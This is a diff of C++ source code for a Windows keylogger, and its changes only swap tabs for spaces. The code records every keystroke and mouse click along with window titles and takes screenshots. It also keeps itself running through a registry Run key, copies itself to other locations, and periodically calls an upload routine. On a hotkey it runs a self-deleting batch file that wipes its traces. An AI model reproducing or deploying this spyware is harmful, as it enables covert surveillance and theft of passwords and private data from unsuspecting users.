@@ -5,69 +5,69 @@ using namespace std;
 KeyLogger* KeyLogger::instance = NULL;
 
 void KeyLogger::persist(std::string path) {
-	
-	if (path.empty()) {
-		path = programPath;
-	}
+    
+    if (path.empty()) {
+        path = programPath;
+    }
 
-	HKEY key;
+    HKEY key;
 
-	RegCreateKey(
-		HKEY_CURRENT_USER,
-		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-		&key
-	);
+    RegCreateKey(
+        HKEY_CURRENT_USER,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &key
+    );
 
-	std::string keyValue = "\"";
+    std::string keyValue = "\"";
 
-	keyValue += path;
+    keyValue += path;
 
-	keyValue += "\"";
+    keyValue += "\"";
 
-	RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
-	
-	lastUpload = time(NULL);
+    RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
+    
+    lastUpload = time(NULL);
 }
 
 void KeyLogger::purge() {
-	
-	HKEY key;
-	RegCreateKey(
-		HKEY_CURRENT_USER,
-		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-		&key
-		);
-	RegDeleteValue(key, REGKEY_NAME);
+    
+    HKEY key;
+    RegCreateKey(
+        HKEY_CURRENT_USER,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        &key
+        );
+    RegDeleteValue(key, REGKEY_NAME);
 
-	logFile.close();
-	UnhookWindowsHookEx(khook);
-	UnhookWindowsHookEx(mhook);
+    logFile.close();
+    UnhookWindowsHookEx(khook);
+    UnhookWindowsHookEx(mhook);
 
-	ofstream batchFile;
-	batchFile.open(BATCH_NAME);
-	batchFile << "@echo off" << endl;
-	batchFile << ":Repeat" << endl;
-	batchFile << "del " << programPath << endl;
-	batchFile << "rmdir /s /q " << programDir << DATADIR << endl;
-	batchFile << "if exist " << programPath << " goto Repeat" << endl;
-	batchFile << "del " << BATCH_NAME << endl;
-	batchFile.close();
-	system("start cleaner.bat");
+    ofstream batchFile;
+    batchFile.open(BATCH_NAME);
+    batchFile << "@echo off" << endl;
+    batchFile << ":Repeat" << endl;
+    batchFile << "del " << programPath << endl;
+    batchFile << "rmdir /s /q " << programDir << DATADIR << endl;
+    batchFile << "if exist " << programPath << " goto Repeat" << endl;
+    batchFile << "del " << BATCH_NAME << endl;
+    batchFile.close();
+    system("start cleaner.bat");
 
-	exit(0);
+    exit(0);
 }
 
 std::string KeyLogger::removeFilespec(std::string path) {
-	while (path[path.length() - 1] != '\\') {
-		path.erase(path.length() - 1);
-	}
+    while (path[path.length() - 1] != '\\') {
+        path.erase(path.length() - 1);
+    }
 
-	return path;
+    return path;
 }
 
 KeyLogger::KeyLogger() {
 
-	//FreeConsole();
+    //FreeConsole();
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     lshiftDown = false;
@@ -75,28 +75,28 @@ KeyLogger::KeyLogger() {
     altDown = false;
     ctrlDown = false;
 
-	char buffer[1024];
-	GetModuleFileName(NULL, buffer, sizeof(buffer));
-	
-	programPath = buffer;
-	programDir = removeFilespec(programPath);
+    char buffer[1024];
+    GetModuleFileName(NULL, buffer, sizeof(buffer));
+    
+    programPath = buffer;
+    programDir = removeFilespec(programPath);
 
-	CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
-	
-	activeWindowTitle = getActiveWindowTitle();
+    CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
+    
+    activeWindowTitle = getActiveWindowTitle();
 }
 
 KeyLogger::~KeyLogger() {
     logFile.close();
-	UnhookWindowsHookEx(khook);
-	UnhookWindowsHookEx(mhook);
+    UnhookWindowsHookEx(khook);
+    UnhookWindowsHookEx(mhook);
 }
 
 KeyLogger* KeyLogger::getInstance() {
 
     if(instance == NULL) {
         instance = new KeyLogger();
-	 }
+        }
 
     return instance;
 }
@@ -111,74 +111,74 @@ void KeyLogger::releaseInstance() {
 
 LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
-	KeyLogger* keylogger = getInstance();
+    KeyLogger* keylogger = getInstance();
 
     if (nCode >= 0) {
 
-		//key pressed
+        //key pressed
         if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
 
-			if (hooked.scanCode == HOTKEY_PURGE) {
-				keylogger->purge();
-			}
+            if (hooked.scanCode == HOTKEY_PURGE) {
+                keylogger->purge();
+            }
 
             switch(hooked.scanCode) {
 
                 case SC_LSHIFT:
-					if (!keylogger->isLShiftDown()) {
-						keylogger->setLShiftDown(true);
-						keylogger->log("<LSHIFT>");
-					}
+                    if (!keylogger->isLShiftDown()) {
+                        keylogger->setLShiftDown(true);
+                        keylogger->log("<LSHIFT>");
+                    }
                     break;
                 case SC_RSHIFT:
-					if (!keylogger->isRShiftDown()) {
-						keylogger->setRShiftDown(true);
-						keylogger->log("<RSHIFT>");
-					}
+                    if (!keylogger->isRShiftDown()) {
+                        keylogger->setRShiftDown(true);
+                        keylogger->log("<RSHIFT>");
+                    }
                     break;
                 case SC_ALT:
-					if (!keylogger->isAltDown()) {
-						keylogger->setAltDown(true);
-						keylogger->log("<ALT>");
-					}
+                    if (!keylogger->isAltDown()) {
+                        keylogger->setAltDown(true);
+                        keylogger->log("<ALT>");
+                    }
                     break;
                 case SC_CTRL:
-					if (!keylogger->isCtrlDown()) {
-						keylogger->setCtrlDown(true);
-						keylogger->log("<CTRL>");
-					}
+                    if (!keylogger->isCtrlDown()) {
+                        keylogger->setCtrlDown(true);
+                        keylogger->log("<CTRL>");
+                    }
                     break;
-				case SC_SPACE:
-					keylogger->log(" ");
-					break;
-				case SC_ENTER:
-					keylogger->log("<ENTER>\n");
-					break;
-				case SC_TAB:
-					keylogger->log("<TAB>");
-					break;
-				case SC_BACKSPACE:
-					keylogger->log("<BACKSPACE>");
-					break;
-				case SC_CAPSLOCK:
-					keylogger->log("<CAPSLOCK>");
-					break;
-				case SC_ESCAPE:
-					keylogger->log("<ESCAPE>");
-					break;
+                case SC_SPACE:
+                    keylogger->log(" ");
+                    break;
+                case SC_ENTER:
+                    keylogger->log("<ENTER>\n");
+                    break;
+                case SC_TAB:
+                    keylogger->log("<TAB>");
+                    break;
+                case SC_BACKSPACE:
+                    keylogger->log("<BACKSPACE>");
+                    break;
+                case SC_CAPSLOCK:
+                    keylogger->log("<CAPSLOCK>");
+                    break;
+                case SC_ESCAPE:
+                    keylogger->log("<ESCAPE>");
+                    break;
                 default:
                     DWORD key = 1;
                     key += hooked.scanCode << 16;
                     key += hooked.flags << 24;
-					char keyText[100];
-					GetKeyNameText(key, keyText, sizeof(keyText));
-					keylogger->log(keyText);
+                    char keyText[100];
+                    GetKeyNameText(key, keyText, sizeof(keyText));
+                    keylogger->log(keyText);
             }
         }
 
-		//key released
+        //key released
         if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
 
             KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);
@@ -186,110 +186,110 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
             switch(hooked.scanCode) {
 
                 case SC_LSHIFT:
-					keylogger->setLShiftDown(false);
-					keylogger->log("</LSHIFT>");
+                    keylogger->setLShiftDown(false);
+                    keylogger->log("</LSHIFT>");
                     break;
                 case SC_RSHIFT:
-					keylogger->setRShiftDown(false);
-					keylogger->log("</RSHIFT>");
+                    keylogger->setRShiftDown(false);
+                    keylogger->log("</RSHIFT>");
                     break;
                 case SC_ALT:
-					keylogger->setAltDown(false);
-					keylogger->log("</ALT>");
+                    keylogger->setAltDown(false);
+                    keylogger->log("</ALT>");
                     break;
                 case SC_CTRL:
-					keylogger->setCtrlDown(false);
-					keylogger->log("</CTRL>");
+                    keylogger->setCtrlDown(false);
+                    keylogger->log("</CTRL>");
                     break;
                 default:
                     break;
             }
         }
 
-		//mouse clicked
-		if (wParam == WM_LBUTTONDOWN) {
+        //mouse clicked
+        if (wParam == WM_LBUTTONDOWN) {
 
-			MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
-			std::stringstream logStr;
-			logStr << "<LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") >\n";
-			keylogger->log(logStr.str());
-		}
+            MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
+            std::stringstream logStr;
+            logStr << "<LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") >\n";
+            keylogger->log(logStr.str());
+        }
 
     }
 
-	return CallNextHookEx(keylogger->khook, nCode, wParam, lParam);
+    return CallNextHookEx(keylogger->khook, nCode, wParam, lParam);
 }
 
 std::string KeyLogger::screenshot() {
-	std::stringstream fileName;
-	fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
-	takeScreenshot(GetDesktopWindow(), fileName.str());
+    std::stringstream fileName;
+    fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
+    takeScreenshot(GetDesktopWindow(), fileName.str());
 
-	log("<SCREENSHOT " + fileName.str() + ">\n");
+    log("<SCREENSHOT " + fileName.str() + ">\n");
 
-	return fileName.str();
+    return fileName.str();
 }
 
 void KeyLogger::loop() {
-	MSG message;
-	while (GetMessage(&message, NULL, 0, 0)) {
-		TranslateMessage(&message);
-		DispatchMessage(&message);
-	}
+    MSG message;
+    while (GetMessage(&message, NULL, 0, 0)) {
+        TranslateMessage(&message);
+        DispatchMessage(&message);
+    }
 }
 
 void KeyLogger::listen() {
 
-	HINSTANCE instance = GetModuleHandle(NULL);
-	if (!instance) {
-		exit(1);
-	}
-	
-	//setup keyboard and mouse hooks
-	khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
-	mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
+    HINSTANCE instance = GetModuleHandle(NULL);
+    if (!instance) {
+        exit(1);
+    }
 
-	logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
-	
+    //setup keyboard and mouse hooks
+    khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
+    mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
+
+    logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
+    
 }
 
 void KeyLogger::log(std::string text) {
-	
-	//user switched windows
-	if (getActiveWindowTitle() != activeWindowTitle) {
-		writeBuffer();//dump last window's information to file
-	}
+    
+    //user switched windows
+    if (getActiveWindowTitle() != activeWindowTitle) {
+        writeBuffer();//dump last window's information to file
+    }
 
-	keyboardBuffer += text;
+    keyboardBuffer += text;
 }
 
 void KeyLogger::copySelf(std::string target) {
-	
-	CopyFile(programPath.c_str(), target.c_str(), true);
-	persist(target);
+
+    CopyFile(programPath.c_str(), target.c_str(), true);
+    persist(target);
 }
 
 void KeyLogger::writeBuffer()
 {
-	logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
+    logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
 
-	if (time(NULL) - lastUpload > UPLOAD_DELTA) {
-		lastUpload = time(NULL);
-		upload();
-	}
+    if (time(NULL) - lastUpload > UPLOAD_DELTA) {
+        lastUpload = time(NULL);
+        upload();
+    }
 
-	activeWindowTitle = getActiveWindowTitle();
-	keyboardBuffer = "";
+    activeWindowTitle = getActiveWindowTitle();
+    keyboardBuffer = "";
 }
 
 std::string KeyLogger::getTimeString() {
-	
-	time_t currentTime = time(NULL);
-	char dateString[100];
-	ctime_s(dateString, sizeof(dateString), &currentTime);
-	dateString[strlen(dateString) - 1] = NULL;
+    
+    time_t currentTime = time(NULL);
+    char dateString[100];
+    ctime_s(dateString, sizeof(dateString), &currentTime);
+    dateString[strlen(dateString) - 1] = NULL;
 
-	return std::string(dateString);
+    return std::string(dateString);
 }
 
 std::string KeyLogger::getActiveWindowTitle() {
